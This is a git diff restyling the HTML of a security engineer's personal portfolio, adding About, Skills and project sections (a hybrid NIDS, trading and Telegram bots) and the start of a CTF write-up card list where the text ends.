@@ -1,2095 +1,1420 @@
 <!DOCTYPE html>
-<html lang="en" class="scroll-smooth">
+<html lang="en">
 
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Võ Trọng Đức | Security Engineer & Automation Specialist</title>
+    <title data-i18n="page_title">Võ Trọng Đức | Security Engineer & Automation Specialist</title>
     <meta name="description"
         content="Professional portfolio of Võ Trọng Đức - Security Engineer specializing in SOC, Network Intrusion Detection, and Automation solutions.">
 
-    <!-- OpenGraph Meta Tags -->
-    <meta property="og:title" content="Võ Trọng Đức | Security Engineer & Automation Specialist">
+    <!-- OpenGraph -->
+    <meta property="og:title" content="Võ Trọng Đức | Security Engineer">
     <meta property="og:description"
-        content="Security Engineer specializing in SOC, NIDS, Algo-Trading, and Automation. Explore CTF write-ups, engineering projects, and certifications.">
+        content="Security Engineer specializing in SOC, NIDS, Algo-Trading, and Automation.">
     <meta property="og:type" content="website">
     <meta property="og:url" content="https://matth3wv0.github.io">
-    <meta property="og:image" content="https://matth3wv0.github.io/og-image.png">
 
-    <!-- Twitter Card -->
-    <meta name="twitter:card" content="summary_large_image">
-    <meta name="twitter:title" content="Võ Trọng Đức | Security Engineer">
-    <meta name="twitter:description"
-        content="Security Engineer specializing in SOC, NIDS, Algo-Trading, and Automation.">
-
-    <!-- Tailwind CSS -->
-    <script src="https://cdn.tailwindcss.com"></script>
-    <script>
-        tailwind.config = {
-            theme: {
-                extend: {
-                    colors: {
-                        'deep-space': '#050505',
-                        'card': '#0F0F0F',
-                        'card-border': '#1F1F1F',
-                        'emerald-accent': '#10B981',
-                        'blue-accent': '#3B82F6',
-                    },
-                    fontFamily: {
-                        'sans': ['Inter', 'system-ui', 'sans-serif'],
-                        'mono': ['JetBrains Mono', 'monospace'],
-                    },
-                }
-            }
-        }
-    </script>
-
-    <!-- Google Fonts -->
+    <!-- Fonts -->
     <link rel="preconnect" href="https://fonts.googleapis.com">
     <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
     <link
         href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&family=JetBrains+Mono:wght@400;500;600&display=swap"
         rel="stylesheet">
 
+    <!-- Styles -->
+    <link rel="stylesheet" href="assets/css/styles.css">
+
     <!-- Prism.js for Code Highlighting -->
     <link href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism-tomorrow.min.css" rel="stylesheet">
 
     <!-- Lucide Icons -->
     <script src="https://unpkg.com/lucide@latest"></script>
-
-    <style>
-        body {
-            background-color: #050505;
-            font-family: 'Inter', system-ui, sans-serif;
-        }
-
-        .font-mono {
-            font-family: 'JetBrains Mono', monospace;
-        }
-
-        /* Animated Gradient Background */
-        .animated-bg {
-            position: fixed;
-            top: 0;
-            left: 0;
-            right: 0;
-            bottom: 0;
-            z-index: -1;
-            overflow: hidden;
-        }
-
-        .animated-bg::before {
-            content: '';
-            position: absolute;
-            top: -50%;
-            left: -50%;
-            width: 200%;
-            height: 200%;
-            background:
-                radial-gradient(ellipse at 20% 20%, rgba(16, 185, 129, 0.15) 0%, transparent 50%),
-                radial-gradient(ellipse at 80% 80%, rgba(59, 130, 246, 0.12) 0%, transparent 50%),
-                radial-gradient(ellipse at 40% 60%, rgba(139, 92, 246, 0.08) 0%, transparent 40%);
-            animation: float-gradient 20s ease-in-out infinite;
-        }
-
-        .animated-bg::after {
-            content: '';
-            position: absolute;
-            top: 0;
-            left: 0;
-            right: 0;
-            bottom: 0;
-            background:
-                radial-gradient(circle at 70% 30%, rgba(16, 185, 129, 0.1) 0%, transparent 30%),
-                radial-gradient(circle at 30% 70%, rgba(59, 130, 246, 0.08) 0%, transparent 30%);
-            animation: float-gradient-reverse 25s ease-in-out infinite;
-        }
-
-        @keyframes float-gradient {
-
-            0%,
-            100% {
-                transform: translate(0, 0) rotate(0deg);
-            }
-
-            33% {
-                transform: translate(30px, -30px) rotate(5deg);
-            }
-
-            66% {
-                transform: translate(-20px, 20px) rotate(-5deg);
-            }
-        }
-
-        @keyframes float-gradient-reverse {
-
-            0%,
-            100% {
-                transform: translate(0, 0) rotate(0deg);
-            }
-
-            33% {
-                transform: translate(-30px, 30px) rotate(-5deg);
-            }
-
-            66% {
-                transform: translate(20px, -20px) rotate(5deg);
-            }
-        }
-
-        /* Grid pattern overlay */
-        .grid-pattern {
-            position: fixed;
-            top: 0;
-            left: 0;
-            right: 0;
-            bottom: 0;
-            z-index: -1;
-            background-image:
-                linear-gradient(rgba(255, 255, 255, 0.02) 1px, transparent 1px),
-                linear-gradient(90deg, rgba(255, 255, 255, 0.02) 1px, transparent 1px);
-            background-size: 50px 50px;
-            mask-image: radial-gradient(ellipse at center, black 30%, transparent 80%);
-            -webkit-mask-image: radial-gradient(ellipse at center, black 30%, transparent 80%);
-        }
-
-        /* Floating orbs */
-        .orb {
-            position: absolute;
-            border-radius: 50%;
-            filter: blur(80px);
-            animation: float-orb 15s ease-in-out infinite;
-        }
-
-        .orb-1 {
-            width: 400px;
-            height: 400px;
-            background: rgba(16, 185, 129, 0.15);
-            top: 10%;
-            left: 10%;
-            animation-delay: 0s;
-        }
-
-        .orb-2 {
-            width: 350px;
-            height: 350px;
-            background: rgba(59, 130, 246, 0.12);
-            top: 60%;
-            right: 10%;
-            animation-delay: -5s;
-        }
-
-        .orb-3 {
-            width: 300px;
-            height: 300px;
-            background: rgba(139, 92, 246, 0.1);
-            bottom: 20%;
-            left: 30%;
-            animation-delay: -10s;
-        }
-
-        @keyframes float-orb {
-
-            0%,
-            100% {
-                transform: translate(0, 0) scale(1);
-            }
-
-            25% {
-                transform: translate(50px, -30px) scale(1.1);
-            }
-
-            50% {
-                transform: translate(-30px, 50px) scale(0.95);
-            }
-
-            75% {
-                transform: translate(30px, 30px) scale(1.05);
-            }
-        }
-
-        /* Pulsing dot animation */
-        @keyframes pulse-dot {
-
-            0%,
-            100% {
-                opacity: 1;
-                transform: scale(1);
-            }
-
-            50% {
-                opacity: 0.5;
-                transform: scale(1.2);
-            }
-        }
-
-        .pulse-dot {
-            animation: pulse-dot 2s ease-in-out infinite;
-        }
-
-        /* Glow effects */
-        .glow-emerald {
-            box-shadow: 0 0 30px rgba(16, 185, 129, 0.2);
-        }
-
-        .glow-blue {
-            box-shadow: 0 0 30px rgba(59, 130, 246, 0.2);
-        }
-
-        /* Card hover effects */
-        .card-hover {
-            transition: all 0.3s ease;
-            backdrop-filter: blur(10px);
-            background: rgba(15, 15, 15, 0.8);
-        }
-
-        .card-hover:hover {
-            transform: translateY(-4px);
-            border-color: #2F2F2F;
-            background: rgba(15, 15, 15, 0.95);
-        }
-
-        /* Modal animation */
-        .modal {
-            opacity: 0;
-            visibility: hidden;
-            transition: all 0.3s ease;
-        }
-
-        .modal.open {
-            opacity: 1;
-            visibility: visible;
-        }
-
-        .modal-content {
-            transform: scale(0.95) translateY(20px);
-            transition: all 0.3s ease;
-        }
-
-        .modal.open .modal-content {
-            transform: scale(1) translateY(0);
-        }
-
-        /* Timeline line */
-        .timeline-line {
-            background: linear-gradient(to bottom, #10B981, #3B82F6);
-        }
-
-        /* Gradient text */
-        .gradient-text {
-            background: linear-gradient(135deg, #10B981, #3B82F6);
-            -webkit-background-clip: text;
-            -webkit-text-fill-color: transparent;
-            background-clip: text;
-        }
-
-        /* Scrollbar styling */
-        ::-webkit-scrollbar {
-            width: 8px;
-        }
-
-        ::-webkit-scrollbar-track {
-            background: #0F0F0F;
-        }
-
-        ::-webkit-scrollbar-thumb {
-            background: #2F2F2F;
-            border-radius: 4px;
-        }
-
-        ::-webkit-scrollbar-thumb:hover {
-            background: #3F3F3F;
-        }
-
-        /* Filter button active state */
-        .filter-btn.active {
-            background-color: #10B981;
-            color: #050505;
-        }
-
-        /* Glass effect for cards */
-        .glass-card {
-            background: rgba(15, 15, 15, 0.7);
-            backdrop-filter: blur(20px);
-            border: 1px solid rgba(255, 255, 255, 0.05);
-        }
-
-        /* Section backgrounds */
-        .section-glass {
-            background: rgba(15, 15, 15, 0.4);
-            backdrop-filter: blur(10px);
-        }
-
-        /* Image Viewer Lightbox */
-        .lightbox {
-            opacity: 0;
-            visibility: hidden;
-            transition: all 0.3s ease;
-        }
-
-        .lightbox.open {
-            opacity: 1;
-            visibility: visible;
-        }
-
-        .lightbox-img {
-            max-width: 90vw;
-            max-height: 85vh;
-            object-fit: contain;
-            transform: scale(0.9);
-            transition: transform 0.3s ease;
-        }
-
-        .lightbox.open .lightbox-img {
-            transform: scale(1);
-        }
-
-        /* Clickable images in write-ups */
-        .writeup-image {
-            cursor: zoom-in;
-            transition: all 0.2s ease;
-        }
-
-        .writeup-image:hover {
-            opacity: 0.9;
-            transform: scale(1.01);
-        }
-
-        /* Language Toggle */
-        .lang-btn {
-            color: #6B7280;
-        }
-
-        .lang-btn:hover {
-            color: #FFFFFF;
-        }
-
-        .lang-btn.active {
-            background-color: #10B981;
-            color: #050505;
-        }
-    </style>
 </head>
 
-<body class="text-gray-100 antialiased">
+<body>
+    <!-- Background -->
+    <div class="matrix-bg"></div>
+    <div class="grid-overlay"></div>
 
-    <!-- Animated Background -->
-    <div class="animated-bg">
-        <div class="orb orb-1"></div>
-        <div class="orb orb-2"></div>
-        <div class="orb orb-3"></div>
-    </div>
-    <div class="grid-pattern"></div>
+    <!-- Header -->
+    <header class="header" id="header">
+        <div class="header-inner">
+            <a href="#" class="logo">VTĐ</a>
 
-    <!-- Sticky Header -->
-    <header id="header"
-        class="fixed top-0 left-0 right-0 z-50 bg-deep-space/60 backdrop-blur-xl border-b border-card-border/50">
-        <nav class="max-w-6xl mx-auto px-6 py-4 flex items-center justify-between">
-            <a href="#" class="text-xl font-semibold gradient-text">VTĐ</a>
-            <div class="hidden md:flex items-center gap-8">
-                <a href="#projects" class="text-gray-400 hover:text-white transition-colors text-sm"
-                    data-i18n="nav_projects">Projects</a>
-                <a href="#vault" class="text-gray-400 hover:text-white transition-colors text-sm"
-                    data-i18n="nav_vault">CTF Vault</a>
-                <a href="#timeline" class="text-gray-400 hover:text-white transition-colors text-sm"
-                    data-i18n="nav_experience">Experience</a>
-                <a href="#certifications" class="text-gray-400 hover:text-white transition-colors text-sm"
-                    data-i18n="nav_certifications">Certifications</a>
-            </div>
-            <div class="flex items-center gap-4">
-                <!-- Language Toggle -->
-                <div class="flex items-center gap-1 px-2 py-1 rounded-lg glass-card">
-                    <button class="lang-btn active px-2 py-1 text-xs font-mono rounded transition-colors" data-lang="en"
-                        onclick="changeLanguage('en')">EN</button>
-                    <span class="text-gray-600">|</span>
-                    <button class="lang-btn px-2 py-1 text-xs font-mono rounded transition-colors" data-lang="vi"
-                        onclick="changeLanguage('vi')">VI</button>
+            <nav class="nav">
+                <a href="#about" class="nav-link" data-i18n="nav_about">About</a>
+                <a href="#projects" class="nav-link" data-i18n="nav_projects">Projects</a>
+                <a href="#vault" class="nav-link" data-i18n="nav_vault">CTF Vault</a>
+                <a href="#experience" class="nav-link" data-i18n="nav_experience">Experience</a>
+                <a href="#certifications" class="nav-link" data-i18n="nav_certifications">Certifications</a>
+            </nav>
+
+            <div class="nav-right">
+                <div class="lang-toggle">
+                    <button class="lang-btn active" data-lang="en" onclick="changeLanguage('en')">EN</button>
+                    <span class="lang-separator">|</span>
+                    <button class="lang-btn" data-lang="vi" onclick="changeLanguage('vi')">VI</button>
                 </div>
-                <a href="https://github.com/Matth3wV0" target="_blank" rel="noopener"
-                    class="text-gray-400 hover:text-white transition-colors">
-                    <i data-lucide="github" class="w-5 h-5"></i>
+                <a href="https://github.com/Matth3wV0" target="_blank" rel="noopener" class="social-icon">
+                    <i data-lucide="github"></i>
                 </a>
-                <a href="https://linkedin.com/in/votrongduc" target="_blank" rel="noopener"
-                    class="text-gray-400 hover:text-white transition-colors">
-                    <i data-lucide="linkedin" class="w-5 h-5"></i>
+                <a href="https://linkedin.com/in/votrongduc" target="_blank" rel="noopener" class="social-icon">
+                    <i data-lucide="linkedin"></i>
                 </a>
             </div>
-        </nav>
+
+            <button class="mobile-menu-btn">
+                <span></span><span></span><span></span>
+            </button>
+        </div>
     </header>
 
-    <main class="pt-20 relative z-10">
-
+    <main>
         <!-- Hero Section -->
-        <section id="hero" class="min-h-[80vh] flex items-center justify-center px-6">
-            <div class="text-center max-w-3xl">
-                <!-- Status Badge -->
-                <div class="inline-flex items-center gap-2 px-4 py-2 rounded-full glass-card mb-8">
-                    <span class="w-2 h-2 rounded-full bg-emerald-accent pulse-dot"></span>
-                    <span class="text-sm text-gray-400 font-mono"><span data-i18n="hero_status">Status:</span> <span
-                            class="text-emerald-accent" data-i18n="hero_status_value">Active</span></span>
+        <section class="hero" id="hero">
+            <div class="hero-content">
+                <div class="terminal-window">
+                    <div class="terminal-header">
+                        <span class="terminal-dot red"></span>
+                        <span class="terminal-dot yellow"></span>
+                        <span class="terminal-dot green"></span>
+                        <span class="terminal-title">terminal</span>
+                    </div>
+                    <div class="terminal-body">
+                        <div class="terminal-line">
+                            <span class="terminal-prompt">$</span>
+                            <span class="terminal-command">whoami</span>
+                        </div>
+                        <div class="terminal-output">Võ Trọng Đức</div>
+                        <div class="terminal-line">
+                            <span class="terminal-prompt">$</span>
+                            <span class="terminal-command">cat role.txt</span>
+                        </div>
+                        <div class="terminal-output" data-i18n="hero_role">Security Engineer | Automation Specialist
+                        </div>
+                        <div class="terminal-line">
+                            <span class="terminal-prompt">$</span>
+                            <span class="terminal-command">echo $STATUS</span>
+                        </div>
+                        <div class="terminal-output"><span class="text-accent" data-i18n="hero_status_value">Available
+                                for opportunities</span><span class="typing-cursor"></span></div>
+                    </div>
                 </div>
 
-                <h1 class="text-5xl md:text-7xl font-bold mb-6 tracking-tight">
-                    Võ Trọng <span class="gradient-text">Đức</span>
-                </h1>
+                <div class="status-badge">
+                    <span class="status-dot"></span>
+                    <span class="font-mono" data-i18n="hero_status">Open to Work</span>
+                </div>
 
-                <p class="text-xl md:text-2xl text-gray-400 mb-8" data-i18n="hero_role">
-                    Security Engineer | Automation Specialist
-                </p>
+                <h1 class="hero-title">Võ Trọng <span class="highlight">Đức</span></h1>
+                <p class="hero-subtitle" data-i18n="hero_role">Security Engineer | Automation Specialist</p>
+                <p class="hero-description" data-i18n="hero_description">Building secure systems and automating complex
+                    workflows. Passionate about threat detection, algo-trading, and CTF challenges.</p>
 
-                <p class="text-gray-500 max-w-xl mx-auto leading-relaxed mb-10" data-i18n="hero_description">
-                    Building secure systems and automating complex workflows.
-                    Passionate about threat detection, algo-trading, and CTF challenges.
-                </p>
-
-                <div class="flex items-center justify-center gap-4">
-                    <a href="#projects"
-                        class="px-6 py-3 bg-emerald-accent text-deep-space font-semibold rounded-lg hover:bg-emerald-400 transition-all hover:shadow-lg hover:shadow-emerald-accent/25"
-                        data-i18n="hero_btn_projects">
-                        View Projects
-                    </a>
-                    <a href="#vault"
-                        class="px-6 py-3 glass-card text-gray-300 rounded-lg hover:border-gray-600 transition-all hover:bg-white/5"
-                        data-i18n="hero_btn_ctf">
-                        CTF Write-ups
-                    </a>
+                <div class="hero-buttons">
+                    <a href="#projects" class="btn btn-primary" data-i18n="hero_btn_projects">View Projects</a>
+                    <a href="#vault" class="btn btn-secondary" data-i18n="hero_btn_ctf">CTF Write-ups</a>
                 </div>
             </div>
         </section>
 
-        <!-- Engineering Projects - Bento Grid -->
-        <section id="projects" class="py-24 px-6">
-            <div class="max-w-6xl mx-auto">
-                <div class="flex items-center gap-3 mb-12">
-                    <i data-lucide="layers" class="w-6 h-6 text-emerald-accent"></i>
-                    <h2 class="text-3xl font-bold" data-i18n="section_projects">Engineering Projects</h2>
+        <!-- About Section -->
+        <section class="section" id="about">
+            <div class="container">
+                <div class="section-header">
+                    <i data-lucide="user" class="section-icon"></i>
+                    <h2 class="section-title" data-i18n="section_about">About Me</h2>
                 </div>
 
-                <div class="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-6">
+                <div class="about-grid">
+                    <div class="about-content card">
+                        <p data-i18n="about_intro">Security-focused engineer with a passion for building automated
+                            solutions and tackling complex cybersecurity challenges. Currently pursuing Information
+                            Assurance at FPT University while working on real-world security projects.</p>
+                        <p data-i18n="about_detail">Experienced in SOC operations, network intrusion detection, and
+                            developing automation tools. Active CTF competitor with expertise in forensics, reverse
+                            engineering, and web exploitation.</p>
 
-                    <!-- Project A: NIDS -->
-                    <div class="lg:col-span-2 glass-card rounded-2xl p-8 card-hover glow-emerald">
-                        <div class="flex items-start justify-between mb-6">
-                            <div class="p-3 bg-emerald-accent/10 rounded-xl">
-                                <i data-lucide="shield-check" class="w-8 h-8 text-emerald-accent"></i>
+                        <div style="margin-top: 1.5rem;">
+                            <div style="display: flex; gap: 1rem; flex-wrap: wrap; font-size: 0.875rem;">
+                                <span><i data-lucide="map-pin"
+                                        style="width:16px;height:16px;display:inline;vertical-align:middle;margin-right:4px;"></i>
+                                    <span data-i18n="about_location">Ho Chi Minh City</span></span>
+                                <span><i data-lucide="graduation-cap"
+                                        style="width:16px;height:16px;display:inline;vertical-align:middle;margin-right:4px;"></i>
+                                    FPT University</span>
+                                <span><i data-lucide="mail"
+                                        style="width:16px;height:16px;display:inline;vertical-align:middle;margin-right:4px;"></i>
+                                    votrongduc0811@gmail.com</span>
                             </div>
-                            <span
-                                class="px-3 py-1 text-xs font-mono bg-emerald-accent/10 text-emerald-accent rounded-full">Security</span>
                         </div>
-                        <h3 class="text-2xl font-bold mb-3" data-i18n="project_nids_title">Hybrid NIDS</h3>
-                        <p class="text-gray-400 mb-6 leading-relaxed" data-i18n="project_nids_desc">
-                            Network Intrusion Detection System combining ELK Stack with Machine Learning
-                            for real-time threat detection. Mapped to MITRE ATT&CK framework.
-                        </p>
-                        <div class="flex flex-wrap gap-2 mb-6">
-                            <span class="px-3 py-1 text-xs font-mono bg-white/5 rounded-full text-gray-400">ELK
-                                Stack</span>
-                            <span class="px-3 py-1 text-xs font-mono bg-white/5 rounded-full text-gray-400">Machine
-                                Learning</span>
-                            <span class="px-3 py-1 text-xs font-mono bg-white/5 rounded-full text-gray-400">MITRE
-                                ATT&CK</span>
-                            <span
-                                class="px-3 py-1 text-xs font-mono bg-white/5 rounded-full text-gray-400">Python</span>
+                    </div>
+
+                    <div class="about-stats">
+                        <div class="card stat-card">
+                            <div class="stat-value">3+</div>
+                            <div class="stat-label" data-i18n="stat_projects">Projects</div>
                         </div>
-                        <div class="grid grid-cols-2 gap-4 pt-6 border-t border-white/5">
+                        <div class="card stat-card">
+                            <div class="stat-value">10+</div>
+                            <div class="stat-label" data-i18n="stat_ctfs">CTF Write-ups</div>
+                        </div>
+                        <div class="card stat-card">
+                            <div class="stat-value">3.2</div>
+                            <div class="stat-label">GPA</div>
+                        </div>
+                        <div class="card stat-card">
+                            <div class="stat-value">8+</div>
+                            <div class="stat-label" data-i18n="stat_certs">Certifications</div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </section>
+
+        <!-- Skills Section -->
+        <section class="section" id="skills">
+            <div class="container">
+                <div class="section-header">
+                    <i data-lucide="code-2" class="section-icon"></i>
+                    <h2 class="section-title" data-i18n="section_skills">Skills</h2>
+                </div>
+
+                <div class="skills-grid">
+                    <div class="card skill-category">
+                        <h4 data-i18n="skills_security">Security</h4>
+                        <div class="skill-item">
+                            <div class="skill-header"><span class="skill-name">SOC Operations</span><span
+                                    class="skill-level">90%</span></div>
+                            <div class="skill-bar">
+                                <div class="skill-progress" style="width:90%"></div>
+                            </div>
+                        </div>
+                        <div class="skill-item">
+                            <div class="skill-header"><span class="skill-name">Network Intrusion Detection</span><span
+                                    class="skill-level">85%</span></div>
+                            <div class="skill-bar">
+                                <div class="skill-progress" style="width:85%"></div>
+                            </div>
+                        </div>
+                        <div class="skill-item">
+                            <div class="skill-header"><span class="skill-name">Penetration Testing</span><span
+                                    class="skill-level">75%</span></div>
+                            <div class="skill-bar">
+                                <div class="skill-progress" style="width:75%"></div>
+                            </div>
+                        </div>
+                        <div class="skill-item">
+                            <div class="skill-header"><span class="skill-name">MITRE ATT&CK</span><span
+                                    class="skill-level">80%</span></div>
+                            <div class="skill-bar">
+                                <div class="skill-progress" style="width:80%"></div>
+                            </div>
+                        </div>
+                    </div>
+
+                    <div class="card skill-category">
+                        <h4 data-i18n="skills_development">Development & Tools</h4>
+                        <div class="skill-item">
+                            <div class="skill-header"><span class="skill-name">Python</span><span
+                                    class="skill-level">90%</span></div>
+                            <div class="skill-bar">
+                                <div class="skill-progress" style="width:90%"></div>
+                            </div>
+                        </div>
+                        <div class="skill-item">
+                            <div class="skill-header"><span class="skill-name">ELK Stack</span><span
+                                    class="skill-level">85%</span></div>
+                            <div class="skill-bar">
+                                <div class="skill-progress" style="width:85%"></div>
+                            </div>
+                        </div>
+                        <div class="skill-item">
+                            <div class="skill-header"><span class="skill-name">Wireshark / IDA Pro</span><span
+                                    class="skill-level">80%</span></div>
+                            <div class="skill-bar">
+                                <div class="skill-progress" style="width:80%"></div>
+                            </div>
+                        </div>
+                        <div class="skill-item">
+                            <div class="skill-header"><span class="skill-name">Selenium / Web Scraping</span><span
+                                    class="skill-level">85%</span></div>
+                            <div class="skill-bar">
+                                <div class="skill-progress" style="width:85%"></div>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </section>
+
+        <!-- Projects Section -->
+        <section class="section" id="projects">
+            <div class="container">
+                <div class="section-header">
+                    <i data-lucide="layers" class="section-icon"></i>
+                    <h2 class="section-title" data-i18n="section_projects">Engineering Projects</h2>
+                </div>
+
+                <div class="grid-3">
+                    <!-- NIDS Project -->
+                    <div class="card project-card card-glow-green" style="grid-column: span 2;">
+                        <div class="project-header">
+                            <div class="project-icon"><i data-lucide="shield-check"></i></div>
+                            <span class="tag tag-green">Security</span>
+                        </div>
+                        <h3 class="project-title" data-i18n="project_nids_title">Hybrid NIDS</h3>
+                        <p class="project-description" data-i18n="project_nids_desc">Developed a hybrid NIDS integrating
+                            Suricata signature-based detection with ML models (Random Forest, XGBoost) trained on
+                            CICIDS2017 dataset. Features real-time alerting via Telegram API with 95% detection
+                            accuracy.</p>
+                        <div class="project-tags">
+                            <span class="tag tag-gray">ELK Stack</span>
+                            <span class="tag tag-gray">Machine Learning</span>
+                            <span class="tag tag-gray">MITRE ATT&CK</span>
+                            <span class="tag tag-gray">Python</span>
+                        </div>
+                        <div class="project-stats">
                             <div>
-                                <p class="text-3xl font-bold text-emerald-accent">95%</p>
-                                <p class="text-sm text-gray-500" data-i18n="project_nids_stat1">Detection Accuracy</p>
+                                <div class="project-stat-value">95%</div>
+                                <div class="project-stat-label" data-i18n="project_nids_stat1">Detection Accuracy</div>
                             </div>
                             <div>
-                                <p class="text-3xl font-bold text-emerald-accent">
-                                    < 2s</p>
-                                        <p class="text-sm text-gray-500" data-i18n="project_nids_stat2">Response Time
-                                        </p>
+                                <div class="project-stat-value">&lt; 2s</div>
+                                <div class="project-stat-label" data-i18n="project_nids_stat2">Response Time</div>
                             </div>
                         </div>
                     </div>
 
-                    <!-- Project B: Trading -->
-                    <div class="glass-card rounded-2xl p-8 card-hover glow-blue">
-                        <div class="flex items-start justify-between mb-6">
-                            <div class="p-3 bg-blue-accent/10 rounded-xl">
-                                <i data-lucide="trending-up" class="w-8 h-8 text-blue-accent"></i>
-                            </div>
-                            <span
-                                class="px-3 py-1 text-xs font-mono bg-blue-accent/10 text-blue-accent rounded-full">Automation</span>
+                    <!-- Trading Project -->
+                    <div class="card project-card card-glow-blue">
+                        <div class="project-header">
+                            <div class="project-icon" style="background:rgba(0,136,255,0.15);"><i
+                                    data-lucide="trending-up" style="color:#0088ff;"></i></div>
+                            <span class="tag tag-blue">Automation</span>
                         </div>
-                        <h3 class="text-xl font-bold mb-3" data-i18n="project_trading_title">Prospire Algo-Trading</h3>
-                        <p class="text-gray-400 mb-6 leading-relaxed text-sm" data-i18n="project_trading_desc">
-                            Automated trading platform with decision algorithms for market analysis.
-                        </p>
-                        <div class="flex flex-wrap gap-2 mb-6">
-                            <span
-                                class="px-3 py-1 text-xs font-mono bg-white/5 rounded-full text-gray-400">Python</span>
-                            <span class="px-3 py-1 text-xs font-mono bg-white/5 rounded-full text-gray-400">APIs</span>
+                        <h3 class="project-title" data-i18n="project_trading_title">Prospire Algo-Trading</h3>
+                        <p class="project-description" data-i18n="project_trading_desc">Algorithm-driven cryptocurrency
+                            trading bot with real-time market tracking and automated trade execution.</p>
+                        <div class="project-tags">
+                            <span class="tag tag-gray">Python</span>
+                            <span class="tag tag-gray">APIs</span>
                         </div>
-                        <div class="pt-6 border-t border-white/5">
-                            <p class="text-2xl font-bold text-blue-accent">$100k</p>
-                            <p class="text-sm text-gray-500" data-i18n="project_trading_stat">/week volume</p>
-                        </div>
-                    </div>
-
-                    <!-- Project C: Automation -->
-                    <div class="lg:col-span-3 glass-card rounded-2xl p-8 card-hover">
-                        <div class="flex flex-col md:flex-row md:items-center gap-6">
-                            <div class="flex items-start gap-4 flex-1">
-                                <div class="p-3 bg-gradient-to-br from-emerald-accent/10 to-blue-accent/10 rounded-xl">
-                                    <i data-lucide="bot" class="w-8 h-8 text-gray-300"></i>
-                                </div>
-                                <div>
-                                    <h3 class="text-xl font-bold mb-2" data-i18n="project_bot_title">Financial Telegram
-                                        Bot & Python Scrapers</h3>
-                                    <p class="text-gray-400 text-sm" data-i18n="project_bot_desc">
-                                        Automated data collection with Producer-Consumer pattern for high-throughput
-                                        processing.
-                                    </p>
-                                </div>
-                            </div>
-                            <div class="flex flex-wrap gap-2">
-                                <span class="px-3 py-1 text-xs font-mono bg-white/5 rounded-full text-gray-400">Telegram
-                                    API</span>
-                                <span
-                                    class="px-3 py-1 text-xs font-mono bg-white/5 rounded-full text-gray-400">Producer-Consumer</span>
-                                <span
-                                    class="px-3 py-1 text-xs font-mono bg-white/5 rounded-full text-gray-400">Selenium</span>
-                                <span
-                                    class="px-3 py-1 text-xs font-mono bg-white/5 rounded-full text-gray-400">BeautifulSoup</span>
+                        <div class="project-stats">
+                            <div>
+                                <div class="project-stat-value">$100k</div>
+                                <div class="project-stat-label" data-i18n="project_trading_stat">/week volume</div>
                             </div>
                         </div>
                     </div>
 
-                </div>
-            </div>
-        </section>
-
-        <!-- CTF Write-up Archive - The Vault -->
-        <section id="vault" class="py-24 px-6 section-glass">
-            <div class="max-w-6xl mx-auto">
-                <div class="flex items-center gap-3 mb-8">
-                    <i data-lucide="archive" class="w-6 h-6 text-emerald-accent"></i>
-                    <h2 class="text-3xl font-bold" data-i18n="section_vault">The Vault</h2>
-                    <span class="text-gray-500 text-sm ml-2" data-i18n="section_vault_subtitle">CTF Write-up
-                        Archive</span>
-                </div>
-
-                <!-- Filter Buttons -->
-                <div class="flex flex-wrap gap-3 mb-8">
-                    <button
-                        class="filter-btn active px-4 py-2 text-sm font-medium rounded-lg glass-card text-gray-400 hover:text-white transition-colors"
-                        data-filter="all" data-i18n="filter_all">
-                        All
-                    </button>
-                    <button
-                        class="filter-btn px-4 py-2 text-sm font-medium rounded-lg glass-card text-gray-400 hover:text-white transition-colors"
-                        data-filter="forensic" data-i18n="filter_forensic">
-                        Forensic
-                    </button>
-                    <button
-                        class="filter-btn px-4 py-2 text-sm font-medium rounded-lg glass-card text-gray-400 hover:text-white transition-colors"
-                        data-filter="reverse" data-i18n="filter_reverse">
-                        Reverse
-                    </button>
-                    <button
-                        class="filter-btn px-4 py-2 text-sm font-medium rounded-lg glass-card text-gray-400 hover:text-white transition-colors"
-                        data-filter="web" data-i18n="filter_web">
-                        Web
-                    </button>
-                </div>
-
-                <!-- Write-up Cards -->
-                <div class="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-6" id="writeup-grid">
-
-                    <!-- EzLogic - 0CTF 2024 -->
-                    <div class="writeup-card glass-card rounded-xl p-6 cursor-pointer card-hover"
-                        data-category="reverse" data-writeup="ezlogic">
-                        <div class="flex items-center justify-between mb-4">
-                            <span class="px-2 py-1 text-xs font-mono bg-red-500/10 text-red-400 rounded"
-                                data-i18n="ctf_difficulty_hard">1000 pts</span>
-                            <span class="px-2 py-1 text-xs font-mono bg-orange-500/10 text-orange-400 rounded"
-                                data-i18n="ctf_category_reverse">Reverse</span>
-                        </div>
-                        <h3 class="text-lg font-semibold mb-2" data-i18n="ctf_ezlogic_card_title">EzLogic</h3>
-                        <p class="text-gray-500 text-sm mb-4" data-i18n="ctf_ezlogic_card_desc">Hardware Logic Analysis
-                            & Verilog Decoding</p>
-                        <div class="flex items-center justify-between">
-                            <div class="flex items-center gap-2 text-emerald-accent text-sm">
-                                <i data-lucide="file-search" class="w-4 h-4"></i>
-                                <span data-i18n="ctf_view">View analysis</span>
+                    <!-- Bot Project -->
+                    <div class="card project-card" style="grid-column: span 3;">
+                        <div style="display:flex; gap:1.5rem; align-items:center; flex-wrap:wrap;">
+                            <div class="project-icon"><i data-lucide="bot"></i></div>
+                            <div style="flex:1;">
+                                <h3 class="project-title" data-i18n="project_bot_title">Financial Telegram Bot & Python
+                                    Scrapers</h3>
+                                <p class="project-description mb-0" data-i18n="project_bot_desc">Telegram bot delivering
+                                    real-time financial statements for 1600+ Vietnamese companies. Integrates web
+                                    scraping tools with async processing for high-throughput data delivery.</p>
                             </div>
-                            <span class="text-xs font-mono text-gray-600">0CTF 2024</span>
-                        </div>
-                    </div>
-
-                    <!-- Easy Forensics - ASICS 2024 -->
-                    <div class="writeup-card glass-card rounded-xl p-6 cursor-pointer card-hover"
-                        data-category="forensic" data-writeup="easy-forensics">
-                        <div class="flex items-center justify-between mb-4">
-                            <span class="px-2 py-1 text-xs font-mono bg-green-500/10 text-green-400 rounded"
-                                data-i18n="ctf_difficulty_easy">Easy</span>
